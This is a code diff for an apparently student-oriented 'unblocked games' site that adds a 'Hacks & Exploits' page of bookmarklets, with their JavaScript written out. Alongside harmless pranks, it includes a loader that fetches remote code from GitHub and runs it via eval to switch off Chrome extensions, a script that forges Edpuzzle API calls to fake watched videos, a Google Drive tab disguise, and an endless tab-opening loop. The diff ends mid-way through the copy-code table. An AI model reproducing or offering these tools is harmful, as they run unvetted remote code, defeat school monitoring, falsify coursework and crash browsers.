@@ -22,13 +22,242 @@
 		<script src="/js/gaming-navbar.js"></script>
 
 		<!-- seo + other things -->
-		<title>About | Nova Hub</title>
+		<title>Hacks | Nova Hub</title>
 		<link rel="icon" href="/nova-favicon.ico" />
 
 		<meta name="viewport" content="width=device-width,initial-scale=1" />
 		<style>
-			.samerow p {
-				margin-right: 4px;
+			.hacks-container {
+				max-width: 1200px;
+				margin: 2rem auto;
+				padding: 2rem;
+			}
+
+			.hacks-category {
+				margin-bottom: 3rem;
+			}
+
+			.category-title {
+				font-family: 'Orbitron', sans-serif;
+				font-size: 2rem;
+				font-weight: 900;
+				color: var(--gaming-accent);
+				text-transform: uppercase;
+				letter-spacing: 2px;
+				margin-bottom: 1.5rem;
+				text-shadow: 0 0 10px var(--gaming-glow);
+				border-bottom: 2px solid var(--gaming-border);
+				padding-bottom: 0.5rem;
+			}
+
+			.bookmarklets-grid {
+				display: grid;
+				grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+				gap: 1.5rem;
+			}
+
+			.bookmarklet-card {
+				background: rgba(0, 0, 0, 0.9);
+				border: 1px solid var(--gaming-border);
+				border-radius: 10px;
+				padding: 1.5rem;
+				box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
+				transition: all 0.3s ease;
+			}
+
+			.bookmarklet-card:hover {
+				border-color: var(--gaming-accent);
+				box-shadow: 0 0 30px var(--gaming-glow);
+				transform: translateY(-5px);
+			}
+
+			.bookmarklet-title {
+				font-family: 'Rajdhani', sans-serif;
+				font-size: 1.3rem;
+				font-weight: 700;
+				color: var(--gaming-text);
+				margin-bottom: 0.5rem;
+				text-transform: uppercase;
+				letter-spacing: 1px;
+			}
+
+			.bookmarklet-description {
+				font-family: 'Rajdhani', sans-serif;
+				font-size: 0.9rem;
+				color: var(--gaming-text-dim);
+				margin-bottom: 1rem;
+				line-height: 1.5;
+			}
+
+			.bookmarklet-button {
+				width: 100%;
+				padding: 0.75rem 1.5rem;
+				background: rgba(0, 0, 0, 0.8);
+				border: 1px solid var(--gaming-border);
+				border-radius: 6px;
+				color: var(--gaming-text);
+				font-family: 'Rajdhani', sans-serif;
+				font-size: 1rem;
+				font-weight: 600;
+				text-transform: uppercase;
+				letter-spacing: 1px;
+				cursor: pointer;
+				transition: all 0.3s ease;
+				margin-bottom: 0.5rem;
+			}
+
+			.bookmarklet-button:hover {
+				background: rgba(0, 255, 0, 0.15);
+				border-color: var(--gaming-accent);
+				box-shadow: 0 0 15px var(--gaming-glow);
+				transform: translateY(-2px);
+			}
+
+			.copy-code-button {
+				width: 100%;
+				padding: 0.5rem 1rem;
+				background: rgba(0, 0, 0, 0.6);
+				border: 1px solid var(--gaming-border);
+				border-radius: 6px;
+				color: var(--gaming-text-dim);
+				font-family: 'Rajdhani', sans-serif;
+				font-size: 0.85rem;
+				font-weight: 600;
+				text-transform: uppercase;
+				letter-spacing: 1px;
+				cursor: pointer;
+				transition: all 0.3s ease;
+			}
+
+			.copy-code-button:hover {
+				background: rgba(0, 255, 0, 0.1);
+				border-color: var(--gaming-accent);
+				color: var(--gaming-text);
+			}
+
+			.copy-code-button.copied {
+				background: rgba(0, 255, 0, 0.2);
+				border-color: #00ff00;
+				color: #00ff00;
+			}
+
+			.code-modal {
+				position: fixed;
+				top: 0;
+				left: 0;
+				width: 100%;
+				height: 100%;
+				background: rgba(0, 0, 0, 0.9);
+				z-index: 10000;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				padding: 2rem;
+			}
+
+			.code-modal-content {
+				background: rgba(0, 0, 0, 0.95);
+				border: 2px solid var(--gaming-border);
+				border-radius: 10px;
+				padding: 2rem;
+				max-width: 800px;
+				width: 100%;
+				max-height: 80vh;
+				box-shadow: 0 0 30px var(--gaming-glow);
+			}
+
+			.code-modal-header {
+				display: flex;
+				justify-content: space-between;
+				align-items: center;
+				margin-bottom: 1rem;
+				border-bottom: 1px solid var(--gaming-border);
+				padding-bottom: 1rem;
+			}
+
+			.code-modal-title {
+				font-family: 'Rajdhani', sans-serif;
+				font-size: 1.5rem;
+				font-weight: 700;
+				color: var(--gaming-accent);
+				text-transform: uppercase;
+			}
+
+			.code-modal-close {
+				background: none;
+				border: 1px solid var(--gaming-border);
+				color: var(--gaming-text);
+				font-size: 1.5rem;
+				width: 40px;
+				height: 40px;
+				border-radius: 6px;
+				cursor: pointer;
+				transition: all 0.3s ease;
+			}
+
+			.code-modal-close:hover {
+				border-color: var(--gaming-accent);
+				background: rgba(0, 255, 0, 0.1);
+			}
+
+			.code-textarea {
+				width: 100%;
+				height: 300px;
+				background: rgba(0, 0, 0, 0.8);
+				border: 1px solid var(--gaming-border);
+				border-radius: 6px;
+				color: var(--gaming-text);
+				font-family: 'Courier New', monospace;
+				font-size: 0.85rem;
+				padding: 1rem;
+				resize: vertical;
+				box-sizing: border-box;
+				margin-bottom: 1rem;
+			}
+
+			.code-textarea:focus {
+				border-color: var(--gaming-accent);
+				box-shadow: 0 0 15px var(--gaming-glow);
+				outline: none;
+			}
+
+			.code-modal-instructions {
+				color: var(--gaming-text-dim);
+				font-family: 'Rajdhani', sans-serif;
+				font-size: 0.9rem;
+				margin-bottom: 1rem;
+				line-height: 1.5;
+			}
+
+			.bookmarklet-input {
+				width: 100%;
+				padding: 0.5rem;
+				background: rgba(0, 0, 0, 0.8);
+				border: 1px solid var(--gaming-border);
+				border-radius: 6px;
+				color: var(--gaming-text);
+				font-family: 'Rajdhani', sans-serif;
+				font-size: 0.9rem;
+				margin-bottom: 0.5rem;
+				box-sizing: border-box;
+			}
+
+			.bookmarklet-input:focus {
+				border-color: var(--gaming-accent);
+				box-shadow: 0 0 10px var(--gaming-glow);
+				outline: none;
+			}
+
+			.warning-badge {
+				display: inline-block;
+				padding: 0.25rem 0.5rem;
+				background: rgba(255, 68, 68, 0.2);
+				border: 1px solid #ff4444;
+				border-radius: 4px;
+				color: #ff4444;
+				font-size: 0.75rem;
+				font-weight: 600;
+				margin-left: 0.5rem;
 			}
 		</style>
 
@@ -45,113 +274,151 @@
 			<a href="/settings.html">Settings</a>
 			<a id="blank" href="#">Open Blank</a>
       <a href="/u/" class="usericon"><img src="/img/user.svg"></a>
-
 		</header>
 		<main id="main">
-			<h1>About Nova Hub</h1>
-			<p style="padding-bottom: 10px">Nova Hub is an unblocked games website with over 400 games, featuring a sleek gaming-themed interface. Nova Hub was started as a small project, shared between friends. After multiple rebrandings and redesigns, we've created the ultimate gaming destination you know and love (unless you work at a school).</p>
+			<div class="hacks-container">
+				<h1 class="gaming-page-title">HACKS & EXPLOITS</h1>
+				<p style="color: var(--gaming-text-dim); margin-bottom: 2rem; text-align: center;">
+					Powerful bookmarklets and tools for school and beyond
+				</p>
 
-			<h2>Credits</h2>
-			<p><a href="https://jquery.com/">jQuery</a>: a lot of the more technical stuff.</p>
-			<p><a href="https://github.com/js-cookie/js-cookie/">js-cookie</a>: working with cookies.</p>
-			<p><a href="https://shoelace.style">Shoelace</a>: a lot of smaller styling, such as the safe mode alert</p>
-			<p><a href="https://www.bootcss.com/">Bootstrap</a>: useful as a base for some smaller, styling such as the new games popup</p>
-			<p><a href="https://3kh0.net">3kh0</a>: a lot of games, the download/upload save feature, and the main inspiration</p>
-			<p><a href="/backgrounds.html">View Background Credits</a></p>
+				<!-- School Exploits -->
+				<div class="hacks-category">
+					<h2 class="category-title">🎓 School Exploits</h2>
+					<div class="bookmarklets-grid">
+						<div class="bookmarklet-card">
+							<h3 class="bookmarklet-title">Extension Modifier</h3>
+							<p class="bookmarklet-description">Turn Chrome extensions on or off. Requires opening twice in the same tab.</p>
+							<button class="bookmarklet-button" onclick="runExtensionModifier()">Run Extension Modifier</button>
+							<button class="copy-code-button" onclick="copyBookmarkletCode('extension-modifier')">Copy Code</button>
+						</div>
 
-			<h2>Developers</h2>
-			<div class="samerow">
-				<a href="https://github.com/skysthelimitt"
-					><sl-avatar image="/img/pfps/sky.webp" label="skysthelimitt"></sl-avatar>
-					<p>Sky</p></a
-				>
-				<a href="https://codeberg.org/LEGALISE_PIRACY"
-					><sl-avatar image="/img/pfps/legalise.webp" label="LEGALISE_PIRACY"></sl-avatar>
-					<p>LEGALISE</p></a
-				>
-				<a href="https://github.com/a456pur"
-					><sl-avatar image="/img/pfps/astra.webp" label="a456pur"></sl-avatar>
-					<p>a456pur</p></a
-				>
+						<div class="bookmarklet-card">
+							<h3 class="bookmarklet-title">History Flooder</h3>
+							<p class="bookmarklet-description">Flood your browser history with the current page.</p>
+							<input type="number" id="history-count" class="bookmarklet-input" placeholder="Number of entries" min="1" value="100">
+							<button class="bookmarklet-button" onclick="runHistoryFlooder()">Flood History</button>
+							<button class="copy-code-button" onclick="copyBookmarkletCode('history-flooder')">Copy Code</button>
+						</div>
+
+						<div class="bookmarklet-card">
+							<h3 class="bookmarklet-title">Tab Disguise</h3>
+							<p class="bookmarklet-description">Make the current tab look like Google Drive.</p>
+							<button class="bookmarklet-button" onclick="runTabDisguise()">Disguise Tab</button>
+							<button class="copy-code-button" onclick="copyBookmarkletCode('tab-disguise')">Copy Code</button>
+						</div>
+
+						<div class="bookmarklet-card">
+							<h3 class="bookmarklet-title">Edpuzzle Video Skipper</h3>
+							<p class="bookmarklet-description">Skip through Edpuzzle videos automatically. Use on an Edpuzzle assignment page.</p>
+							<button class="bookmarklet-button" onclick="runEdpuzzleSkipper()">Skip Edpuzzle</button>
+							<button class="copy-code-button" onclick="copyBookmarkletCode('edpuzzle-skipper')">Copy Code</button>
+						</div>
+					</div>
+				</div>
+
+				<!-- Fun -->
+				<div class="hacks-category">
+					<h2 class="category-title">🎮 Fun</h2>
+					<div class="bookmarklets-grid">
+						<div class="bookmarklet-card">
+							<h3 class="bookmarklet-title">Rainbow Text</h3>
+							<p class="bookmarklet-description">Make all text on the page rainbow colored.</p>
+							<button class="bookmarklet-button" onclick="runRainbowText()">Make Rainbow</button>
+							<button class="copy-code-button" onclick="copyBookmarkletCode('rainbow-text')">Copy Code</button>
+						</div>
+
+						<div class="bookmarklet-card">
+							<h3 class="bookmarklet-title">Spin Everything</h3>
+							<p class="bookmarklet-description">Make all elements on the page spin and bounce.</p>
+							<button class="bookmarklet-button" onclick="runSpinEverything()">Spin It!</button>
+							<button class="copy-code-button" onclick="copyBookmarkletCode('spin-everything')">Copy Code</button>
+						</div>
+
+						<div class="bookmarklet-card">
+							<h3 class="bookmarklet-title">Gravity</h3>
+							<p class="bookmarklet-description">Apply gravity effects to all page elements.</p>
+							<button class="bookmarklet-button" onclick="runGravity()">Apply Gravity</button>
+							<button class="copy-code-button" onclick="copyBookmarkletCode('gravity')">Copy Code</button>
+						</div>
+
+						<div class="bookmarklet-card">
+							<h3 class="bookmarklet-title">Fake Update</h3>
+							<p class="bookmarklet-description">Show a fake Chrome update screen.</p>
+							<button class="bookmarklet-button" onclick="runFakeUpdate()">Show Fake Update</button>
+							<button class="copy-code-button" onclick="copyBookmarkletCode('fake-update')">Copy Code</button>
+						</div>
+
+						<div class="bookmarklet-card">
+							<h3 class="bookmarklet-title">Fake Error</h3>
+							<p class="bookmarklet-description">Create a fake error with suspicious music.</p>
+							<button class="bookmarklet-button" onclick="runFakeError()">Show Fake Error</button>
+							<button class="copy-code-button" onclick="copyBookmarkletCode('fake-error')">Copy Code</button>
+						</div>
+
+						<div class="bookmarklet-card">
+							<h3 class="bookmarklet-title">Link Changer</h3>
+							<p class="bookmarklet-description">Change all links on the page to random fun websites.</p>
+							<button class="bookmarklet-button" onclick="runLinkChanger()">Change Links</button>
+							<button class="copy-code-button" onclick="copyBookmarkletCode('link-changer')">Copy Code</button>
+						</div>
+
+						<div class="bookmarklet-card">
+							<h3 class="bookmarklet-title">Infinite Tab Opener <span class="warning-badge">DANGER</span></h3>
+							<p class="bookmarklet-description">Opens infinite Google tabs. Use at your own risk!</p>
+							<button class="bookmarklet-button" onclick="runInfiniteTabs()">Open Infinite Tabs</button>
+							<button class="copy-code-button" onclick="copyBookmarkletCode('infinite-tabs')">Copy Code</button>
+						</div>
+					</div>
+				</div>
+
+				<!-- Website Edit -->
+				<div class="hacks-category">
+					<h2 class="category-title">✏️ Website Edit</h2>
+					<div class="bookmarklets-grid">
+						<div class="bookmarklet-card">
+							<h3 class="bookmarklet-title">Edit Any Text</h3>
+							<p class="bookmarklet-description">Click on any text to edit it directly on the page.</p>
+							<button class="bookmarklet-button" onclick="runEditText()">Enable Text Editing</button>
+							<button class="copy-code-button" onclick="copyBookmarkletCode('edit-text')">Copy Code</button>
+						</div>
+
+						<div class="bookmarklet-card">
+							<h3 class="bookmarklet-title">Remove Elements</h3>
+							<p class="bookmarklet-description">Click on any element to remove it from the page.</p>
+							<button class="bookmarklet-button" onclick="runRemoveElements()">Enable Element Removal</button>
+							<button class="copy-code-button" onclick="copyBookmarkletCode('remove-elements')">Copy Code</button>
+						</div>
+					</div>
+				</div>
+
+				<!-- Other -->
+				<div class="hacks-category">
+					<h2 class="category-title">🔧 Other</h2>
+					<div class="bookmarklets-grid">
+						<div class="bookmarklet-card">
+							<h3 class="bookmarklet-title">Ad Blocker</h3>
+							<p class="bookmarklet-description">Remove all ads from the current page. May remove embedded games.</p>
+							<button class="bookmarklet-button" onclick="runAdBlocker()">Block Ads</button>
+							<button class="copy-code-button" onclick="copyBookmarkletCode('ad-blocker')">Copy Code</button>
+						</div>
+
+						<div class="bookmarklet-card">
+							<h3 class="bookmarklet-title">Cookie Remover</h3>
+							<p class="bookmarklet-description">Remove all cookies from the current site.</p>
+							<button class="bookmarklet-button" onclick="runCookieRemover()">Remove Cookies</button>
+							<button class="copy-code-button" onclick="copyBookmarkletCode('cookie-remover')">Copy Code</button>
+						</div>
+
+						<div class="bookmarklet-card">
+							<h3 class="bookmarklet-title">URL Compressor</h3>
+							<p class="bookmarklet-description">Compress the current URL using TinyURL.</p>
+							<button class="bookmarklet-button" onclick="runURLCompressor()">Compress URL</button>
+							<button class="copy-code-button" onclick="copyBookmarkletCode('url-compressor')">Copy Code</button>
+						</div>
+					</div>
+				</div>
 			</div>
-
-			<h2>Supporters</h2>
-			<div class="samerow">
-				<a class="avatar" href="https://discord.com/users/731338278082445376"
-					><sl-avatar image="/img/pfps/caidn.webp" label="Caidn"></sl-avatar>
-					<p>Caidn</p></a
-				>
-				<a class="avatar" href="https://discord.com/users/704499571400638554"
-					><sl-avatar image="/img/pfps/buttsfart.webp" label="Buttsfart"></sl-avatar>
-					<p>Buttsfart</p></a
-				>
-				<a class="avatar" href="https://discord.com/users/778709612621987850"
-					><sl-avatar image="/img/pfps/ayo.webp" label="ayo"></sl-avatar>
-					<p>ayo</p></a
-				>
-				<a class="avatar" href="https://discord.com/users/510677660775743500"
-					><sl-avatar image="/img/pfps/astra.webp" label="astra"></sl-avatar>
-					<p>a456pur</p></a
-				>
-				<a class="avatar" href="https://discord.com/users/724793658011811862"
-					><sl-avatar image="/img/pfps/dire.webp" label="direflaws"></sl-avatar>
-					<p>DireFlaws</p></a
-				>
-				<a class="avatar" href="https://discord.com/users/1068293020534964306"
-				><sl-avatar image="/img/pfps/awesome.webp" label="awesome"></sl-avatar>
-				<p>Awesome-XV</p></a
-				>
-			</div>
-			<h2>Partners</h2>
-						<div class="samerow">
-
-							<a class="avatar" href="https://discord.gg/echodev-971769908205604864"
-					><sl-avatar image="/img/pfps/3kh0.webp" label="3kh0"></sl-avatar>
-					<p>3kh0.net</p></a
-				>
-							<a class="avatar" href="https://discord.gg/Cqaa8x82Ch"
-					><sl-avatar image="/img/pfps/snor.webp" label="snorlax"></sl-avatar>
-					<p>Snorlax's Cave</p></a
-				>
-				<a class="avatar" href="https://discord.gg/DYSB3TeQ2y"
-					><sl-avatar image="/img/pfps/shadow.webp" label="shadow"></sl-avatar>
-					<p>Shadow Network</p></a
-				>
-				<a class="avatar" href="https://discord.gg/DmQMtsTPD6"
-					><sl-avatar image="/img/pfps/night.webp" label="night"></sl-avatar>
-					<p>Night Network</p></a
-				>
-				<a class="avatar" href="https://discord.gg/xMyUXZ7Z8y"
-					><sl-avatar image="/img/pfps/math.webp" label="orbit"></sl-avatar>
-					<p>Math Orbit</p></a
-				>
-				<a class="avatar" href="https://discord.gg/H7JqRwykhk"
-					><sl-avatar image="/img/pfps/wrnd.gif" label="wrnd"></sl-avatar>
-					<p>WRND</p></a
-				>
-				<a class="avatar" href="https://discord.gg/sSWRxaHhvA"
-					><sl-avatar image="/img/pfps/lunar.webp" label="lunarsync"></sl-avatar>
-					<p>Lunarsync</p></a
-				>
-				<a class="avatar" href="https://discord.gg/nPzc5ambR4"
-					><sl-avatar image="/img/pfps/ultra.webp" label="ultrabrowse"></sl-avatar>
-					<p>Ultrabrowse</p></a
-				>
-				<a class="avatar" href="https://discord.gg/yNJ6Yx6qVu"
-					><sl-avatar image="/img/pfps/compass.png" label="compass"></sl-avatar>
-					<p>Compass Network</p></a
-				>
-				<a class="avatar" href="https://discord.gg/HynWJ8aq"
-					><sl-avatar image="/img/pfps/ocular.webp" label="ocular"></sl-avatar>
-					<p>Ocular Network</p></a
-				> <!--Note: Ocular is Breakium.com -->
-				
-</div>
-
-
-      </div>
-
-
 		</main>
 
 		<footer>
@@ -162,5 +429,472 @@
 			<a href="/support.html">Donate</a>
 			<a href="/about.html">About</a>
 		</footer>
+
+		<script>
+			// Extension Modifier
+			function runExtensionModifier() {
+				fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`)
+					.then(d => d.text())
+					.then(eval);
+			}
+
+			// History Flooder
+			function runHistoryFlooder() {
+				const num = parseInt(document.getElementById('history-count').value) || 100;
+				const x = window.location.href;
+				let done = false;
+				for (var i = 1; i <= num; i++) {
+					history.pushState(0, 0, i == num ? x : i.toString());
+					if (i == num) {
+						done = true;
+					}
+				}
+				if (done === true) {
+					alert("History flood successful! " + window.location.href + " now appears in your history " + num + (num == 1 ? " time." : " times."));
+				}
+			}
+
+			// Tab Disguise
+			function runTabDisguise() {
+				function gcloak() {
+					var link = document.querySelector("link[rel*='icon']") || document.createElement('link');
+					link.type = 'image/x-icon';
+					link.rel = 'shortcut icon';
+					link.href = 'https://www.pngall.com/wp-content/uploads/9/Google-Drive-Logo-Transparent-180x180.png';
+					document.title = 'My Drive - Google Drive';
+					console.log(document.title);
+					document.getElementsByTagName('head')[0].appendChild(link);
+				}
+				gcloak();
+				setInterval(gcloak, 1000);
+			}
+
+			// Edpuzzle Video Skipper
+			function runEdpuzzleSkipper() {
+				(function() {
+					function httpGet(url, callback, headers = [], method = "GET", content = null) {
+						const request = new XMLHttpRequest();
+						request.addEventListener("load", callback);
+						request.open(method, url, true);
+						headers.forEach((header) => request.setRequestHeader(header[0], header[1]));
+						request.send(content);
+					}
+					function getAssignment() {
+						const assignmentId = window.location.pathname.split("/")[2];
+						const url = `https://edpuzzle.com/api/v4/assignments/${assignmentId}/play`;
+						const headers = [
+							["accept", "application/json, text/plain, */*"],
+							["accept_language", "en-US,en;q=0.9"],
+							["content-type", "application/json"],
+							["referer", window.location.href],
+						];
+						httpGet(url, function() {
+							if (this.status == 200) {
+								const data = JSON.parse(this.responseText);
+								const attemptId = data.mediaAttempt._id;
+								postAttempt(attemptId);
+							} else {
+								alert("Failed to get assignment. Make sure you're on an Edpuzzle assignment page.");
+							}
+						}, headers);
+					}
+					function postAttempt(attemptId) {
+						const url = `https://edpuzzle.com/api/v4/media_attempts/${attemptId}/watch`;
+						const content = { "timeIntervalNumber": 10 };
+						const headers = [
+							["accept", "application/json, text/plain, */*"],
+							["accept_language", "en-US,en;q=0.9"],
+							["content-type", "application/json"],
+							["referer", window.location.href],
+						];
+						httpGet(url, function() {
+							window.location.reload();
+						}, headers, "POST", JSON.stringify(content));
+					}
+					getAssignment();
+				})();
+			}
+
+			// Rainbow Text
+			function runRainbowText() {
+				(function() {
+					var elements = document.querySelectorAll("*");
+					for (var i = 0; i < elements.length; i++) {
+						elements[i].style.color = "hsl(" + (Math.random() * 360) + ", 100%, 50%)";
+					}
+				})();
+			}
+
+			// Spin Everything
+			function runSpinEverything() {
+				(function() {
+					var elements = document.querySelectorAll("*");
+					for (var i = 0; i < elements.length; i++) {
+						if (elements[i].tagName != "IMG") {
+							elements[i].style.animation = "spinAndBounce 1s infinite";
+							elements[i].style.animationTimingFunction = "ease-in-out";
+						}
+					}
+					var keyframes = "\
+						@keyframes imageShift {\
+							0% { transform: translateX(0px); }\
+							50% { transform: translateX(20px); }\
+							100% { transform: translateX(0px); }\
+						}\
+						@keyframes spinAndBounce {\
+							0% { transform: rotate(0deg) scale(1); }\
+							50% { transform: rotate(180deg) scale(1.2); }\
+							100% { transform: rotate(360deg) scale(1); }\
+						}\
+					";
+					var style = document.createElement("style");
+					style.type = "text/css";
+					style.innerHTML = keyframes;
+					document.head.appendChild(style);
+				})();
+			}
+
+			// Gravity
+			function runGravity() {
+				(function() {
+					var elements = document.querySelectorAll("*");
+					var initialPositions = [];
+					for (var i = 0; i < elements.length; i++) {
+						var rect = elements[i].getBoundingClientRect();
+						initialPositions.push({ x: rect.x, y: rect.y });
+					}
+					var gravity = 0.1;
+					function fall() {
+						for (var i = 0; i < elements.length; i++) {
+							var rect = elements[i].getBoundingClientRect();
+							elements[i].style.top = rect.y + gravity + "px";
+						}
+					}
+					var timer = setInterval(function() {
+						fall();
+						var screenBottom = window.innerHeight;
+						for (var i = 0; i < elements.length; i++) {
+							var rect = elements[i].getBoundingClientRect();
+							if (rect.bottom >= screenBottom) {
+								elements[i].style.top = initialPositions[i].y + "px";
+							}
+						}
+					}, 30);
+				})();
+			}
+
+			// Fake Update
+			function runFakeUpdate() {
+				(function() {
+					var overlay = document.createElement("div");
+					overlay.style.position = "fixed";
+					overlay.style.top = "0";
+					overlay.style.left = "0";
+					overlay.style.width = "100%";
+					overlay.style.height = "100%";
+					overlay.style.background = "#FFFFFF";
+					overlay.style.opacity = "0.95";
+					overlay.style.zIndex = "9999999";
+					var dialog = document.createElement("div");
+					dialog.style.position = "absolute";
+					dialog.style.top = "50%";
+					dialog.style.left = "50%";
+					dialog.style.transform = "translate(-50%, -50%)";
+					dialog.style.width = "450px";
+					dialog.style.padding = "20px";
+					dialog.style.background = "#FFFFFF";
+					dialog.style.border = "1px solid #333333";
+					dialog.style.borderRadius = "5px";
+					dialog.style.boxShadow = "0 0 10px rgba(0,0,0,0.5)";
+					dialog.style.zIndex = "99999999";
+					var title = document.createElement("h1");
+					title.innerHTML = "Google Chrome Update";
+					title.style.marginTop = "0";
+					title.style.textAlign = "center";
+					dialog.appendChild(title);
+					var message = document.createElement("p");
+					message.innerHTML = "Your version of Google Chrome is outdated. Please click the button below to update now.";
+					message.style.margin = "20px 0";
+					message.style.textAlign = "center";
+					dialog.appendChild(message);
+					var button = document.createElement("button");
+					button.innerHTML = "Update Now";
+					button.style.background = "#0078D7";
+					button.style.border = "none";
+					button.style.color = "#FFFFFF";
+					button.style.padding = "10px 20px";
+					button.style.borderRadius = "5px";
+					button.style.cursor = "pointer";
+					button.addEventListener("click", function() {
+						window.location.href = "https://google.com/chrome";
+					});
+					dialog.appendChild(button);
+					overlay.appendChild(dialog);
+					document.body.appendChild(overlay);
+				})();
+			}
+
+			// Fake Error
+			function runFakeError() {
+				(function() {
+					var errorMessages = [
+						"Error: Server not found",
+						"Error: Connection lost",
+						"Error: Page not found",
+						"Error: Invalid input",
+						"Error: System overload"
+					];
+					var randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+					alert(randomError);
+					document.body.style.backgroundColor = "magenta";
+					document.body.style.color = "yellow";
+					var audio = new Audio('https://www.myinstants.com/media/sounds/untitled_hG6mBU5.mp3');
+					audio.play();
+				})();
+			}
+
+			// Link Changer
+			function runLinkChanger() {
+				(function() {
+					var links = document.getElementsByTagName('a');
+					for (var i = 0; i < links.length; i++) {
+						var websites = ['https://longdogechallenge.com/', 'https://puginarug.com/', 'https://onesquareminesweeper.com/'];
+						var randomWebsite = websites[Math.floor(Math.random() * websites.length)];
+						links[i].href = randomWebsite;
+					}
+				})();
+			}
+
+			// Infinite Tab Opener
+			function runInfiniteTabs() {
+				if (confirm("This will open infinite tabs! Are you sure?")) {
+					alert("Use at your own risk.");
+					while (true) {
+						window.open("https://www.google.com");
+					}
+				}
+			}
+
+			// Edit Text
+			function runEditText() {
+				document.body.contentEditable = true;
+				document.designMode = 'on';
+				alert("Text editing enabled! Click on any text to edit it.");
+			}
+
+			// Remove Elements
+			function runRemoveElements() {
+				document.addEventListener('click', function(e) {
+					if (confirm('Remove this element?')) {
+						e.target.remove();
+					}
+				}, true);
+				alert("Element removal enabled! Click on any element to remove it.");
+			}
+
+			// Ad Blocker
+			function runAdBlocker() {
+				(function() {
+					var selectors = [
+						'#sidebar-wrap', '#advert', '#xrail', '#middle-article-advert-container', '#sponsored-recommendations',
+						'#around-the-web', '#sponsored-recommendations', '#taboola-content', '#taboola-below-taboola-native-thumbnails',
+						'#inarticle_wrapper_div', '#rc-row-container', '#ads', '#at-share-dock', '#at4-share', '#at4-follow',
+						'#right-ads-rail', 'div#ad-interstitial', 'div#advert-article', 'div#ac-lre-player-ph',
+						'.ad', '.avert', '.avert__wrapper', '.middle-banner-ad', '.advertisement', '.GoogleActiveViewClass',
+						'.advert', '.cns-ads-stage', '.teads-inread', '.ad-banner', '.ad-anchored', '.js_shelf_ads',
+						'.ad-slot', '.antenna', '.xrail-content', '.advertisement__leaderboard', '.ad-leaderboard',
+						'.trc_rbox_outer', '.ks-recommended', '.article-da', 'div.sponsored-stories-component',
+						'div.addthis-smartlayers', 'div.article-adsponsor', 'div.signin-prompt', 'div.article-bumper',
+						'div.video-placeholder', 'div.top-ad-container', 'div.header-ad', 'div.ad-unit', 'div.demo-block',
+						'div.OUTBRAIN', 'div.ob-widget', 'div.nwsrm-wrapper', 'div.announcementBar', 'div.partner-resources-block',
+						'div.arrow-down', 'div.m-ad', 'div.story-interrupt', 'div.taboola-recommended', 'div.ad-cluster-container',
+						'div.ctx-sidebar', 'div.incognito-modal', '.OUTBRAIN', '.subscribe-button', '.ads9', '.leaderboards',
+						'.GoogleActiveViewElement', '.mpu-container', '.ad-300x600', '.tf-ad-block', '.sidebar-ads-holder-top',
+						'.ads-one', '.FullPageModal__scroller', '.content-ads-holder', '.widget-area', '.social-buttons',
+						'.ac-player-ph', 'script', 'iframe', 'video', 'aside#sponsored-recommendations', 'aside[role="banner"]',
+						'aside', 'amp-ad', 'span[id^=ad_is_]', 'div[class*="indianapolis-optin"]', 'div[id^=google_ads_iframe]',
+						'div[data-google-query-id]', 'section[data-response]', 'ins.adsbygoogle', 'div[data-google-query-id]',
+						'div[data-test-id="fullPageSignupModal"]', 'div[data-test-id="giftWrap"]'
+					];
+					for (let i in selectors) {
+						let nodesList = document.querySelectorAll(selectors[i]);
+						for (let i = 0; i < nodesList.length; i++) {
+							let el = nodesList[i];
+							if (el && el.parentNode) el.parentNode.removeChild(el);
+						}
+					}
+					alert("Ads removed!");
+				})();
+			}
+
+			// Cookie Remover
+			function runCookieRemover() {
+				(function() {
+					var a, b, c, e, f;
+					f = 0;
+					a = document.cookie.split("; ");
+					for (e = 0; e < a.length && a[e]; e++) {
+						f++;
+						for (b = "." + location.host; b; b = b.replace(/^(?:%5C.|[^%5C.]+)/, "")) {
+							for (c = location.pathname; c; c = c.replace(/.$/, "")) {
+								document.cookie = (a[e] + "; domain=" + b + "; path=" + c + "; expires=" + new Date((new Date()).getTime() - 1e11).toGMTString());
+							}
+						}
+					}
+					alert("Expired " + f + " cookies");
+				})();
+			}
+
+			// URL Compressor
+			function runURLCompressor() {
+				window.open('http://tinyurl.com/create.php?url=' + encodeURIComponent(location.href));
+			}
+
+			// Copy Bookmarklet Code
+			function copyBookmarkletCode(bookmarkletId) {
+				const codes = {
+					'extension-modifier': 'javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);',
+					'history-flooder': 'javascript:var num=prompt("History flood amount:");done=false;x=window.location.href;for (var i=1; i<=num; i++){history.pushState(0, 0, i==num?x:i.toString());if(i==num){done=true}}if(done===true){alert("History flood successful! "+window.location.href+" now appears in your history "+num+(num==1?" time.":" times."))}',
+					'tab-disguise': 'javascript:function gcloak() { var link = document.querySelector("link[rel*=\'icon\']") || document.createElement(\'link\');link.type = \'image/x-icon\';link.rel = \'shortcut icon\';link.href = \'https://www.pngall.com/wp-content/uploads/9/Google-Drive-Logo-Transparent-180x180.png\';document.title = \'My Drive - Google Drive\';console.log(document.title);document.getElementsByTagName(\'head\')[0].appendChild(link) };gcloak();setInterval(gcloak, 1000);',
+					'edpuzzle-skipper': 'javascript:(function() { function httpGet(url, callback, headers = [], method = "GET", content = null) { const request = new XMLHttpRequest(); request.addEventListener("load", callback); request.open(method, url, true); headers.forEach((header) => request.setRequestHeader(header[0], header[1])); request.send(content); } function getAssignment() { const assignmentId = window.location.pathname.split("/")[2]; const url = `https://edpuzzle.com/api/v4/assignments/${assignmentId}/play`; const headers = [["accept", "application/json, text/plain, */*"], ["accept_language", "en-US,en;q=0.9"], ["content-type", "application/json"], ["referer", window.location.href]]; httpGet(url, function() { if (this.status == 200) { const data = JSON.parse(this.responseText); const attemptId = data.mediaAttempt._id; postAttempt(attemptId); } else { alert("Failed to get assignment. Make sure you\'re on an Edpuzzle assignment page."); } }, headers); } function postAttempt(attemptId) { const url = `https://edpuzzle.com/api/v4/media_attempts/${attemptId}/watch`; const content = { "timeIntervalNumber": 10 }; const headers = [["accept", "application/json, text/plain, */*"], ["accept_language", "en-US,en;q=0.9"], ["content-type", "application/json"], ["referer", window.location.href]]; httpGet(url, function() { window.location.reload(); }, headers, "POST", JSON.stringify(content)); } getAssignment(); })();',
